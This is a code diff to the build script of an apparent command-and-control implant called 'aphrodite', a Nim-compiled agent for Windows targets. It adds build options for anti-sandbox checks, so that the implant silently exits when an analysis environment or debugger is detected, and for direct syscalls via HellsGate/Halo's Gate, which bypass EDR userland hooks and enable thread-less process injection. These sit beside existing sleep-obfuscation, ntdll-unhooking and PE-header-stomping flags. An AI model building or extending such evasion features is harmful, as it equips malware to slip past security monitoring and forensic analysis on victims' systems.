@@ -109,6 +109,31 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
             default_value=False,
             required=False,
         ),
+        BuildParameter(
+            name="anti_sandbox",
+            parameter_type=BuildParameterType.Boolean,
+            description=(
+                "Anti-sandbox checks (Windows only): at startup, silently exit if an "
+                "analysis environment is detected. Checks: system uptime < 10 min, "
+                "RAM < 4 GB, CPU count < 2, NtQueryInformationProcess debug port, "
+                "and sleep-skipping detection (execution-time acceleration)."
+            ),
+            default_value=False,
+            required=False,
+        ),
+        BuildParameter(
+            name="direct_syscalls",
+            parameter_type=BuildParameterType.Boolean,
+            description=(
+                "Direct syscalls via HellsGate/Halo's Gate (Windows only): resolve NT "
+                "function syscall numbers (SSNs) at runtime by parsing ntdll stubs. "
+                "Injection operations use a patched stub buffer instead of the ntdll "
+                "wrappers, bypassing EDR userland hooks regardless of unhook success. "
+                "Enables the 'threadlessinject' technique (NtQueueApcThreadEx SPECIAL)."
+            ),
+            default_value=False,
+            required=False,
+        ),
     ]
     agent_path = Path("agent_functions")
     agent_icon_path = agent_path / "aphrodite.svg"
@@ -282,9 +307,11 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
             debug = self.get_parameter("debug") or False
             obfuscation = self.get_parameter("obfuscation") or "none"
             output_format = self.get_parameter("output_format") or "exe"
-            sleep_obf    = self.get_parameter("sleep_obf") or False
-            unhook_ntdll = self.get_parameter("unhook_ntdll") or False
-            pe_stamp     = self.get_parameter("pe_stamp") or False
+            sleep_obf      = self.get_parameter("sleep_obf") or False
+            unhook_ntdll   = self.get_parameter("unhook_ntdll") or False
+            pe_stamp       = self.get_parameter("pe_stamp") or False
+            anti_sandbox   = self.get_parameter("anti_sandbox") or False
+            direct_syscalls = self.get_parameter("direct_syscalls") or False
 
             if output_format == "shellcode" and target_os != "windows":
                 build_stderr += "ERROR: shellcode output format is only supported for Windows targets.\n"
@@ -421,6 +448,14 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
                 if pe_stamp and target_os == "windows":
                     nim_flags.append("-d:peStamp")
                     build_stdout += "[*] PE header stomping enabled (zero MZ/PE headers in memory after startup)\n"
+
+                if anti_sandbox and target_os == "windows":
+                    nim_flags.append("-d:antiSandbox")
+                    build_stdout += "[*] Anti-sandbox enabled (uptime/RAM/CPU/debugger/sleep-skip checks at startup)\n"
+
+                if direct_syscalls and target_os == "windows":
+                    nim_flags.append("-d:directSyscalls")
+                    build_stdout += "[*] Direct syscalls enabled (HellsGate/Halo's Gate SSN resolution, threadlessinject available)\n"
 
                 # --- OS-specific compilation flags ---
                 if target_os == "windows":
